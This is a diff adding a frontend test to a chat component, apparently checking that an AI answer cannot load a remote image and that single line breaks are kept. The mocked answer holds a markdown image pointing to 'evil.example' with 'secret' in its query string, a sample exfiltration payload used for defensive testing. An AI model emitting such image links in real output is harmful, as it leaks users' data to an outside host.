@@ -57,6 +57,18 @@ describe("NodeChat — Mode A ask-the-node chat (client-held history)", () => {
     expect(screen.getByText("What changed?").tagName).toBe("DIV");
   });
 
+  it("an answer never loads a remote image and keeps its single line breaks (M-desk-8 review)", async () => {
+    mockAsk.mockResolvedValue({
+      answer: "Line one\nline two\n\n![leak](https://evil.example/p.png?d=secret)",
+    });
+    const { container } = render(<NodeChat runId="r1" nodeId="n-eng" />);
+    fireEvent.change(screen.getByLabelText("Ask this node"), { target: { value: "What?" } });
+    fireEvent.click(screen.getByRole("button", { name: "Send" }));
+    await screen.findByText(/Line one/);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector(".tv-chat__msg--assistant br")).not.toBeNull();
+  });
+
   it("keeps the running history across turns (sends the whole transcript each time)", async () => {
     mockAsk.mockResolvedValueOnce({ answer: "First answer." });
     render(<NodeChat runId="r1" nodeId="n-eng" />);
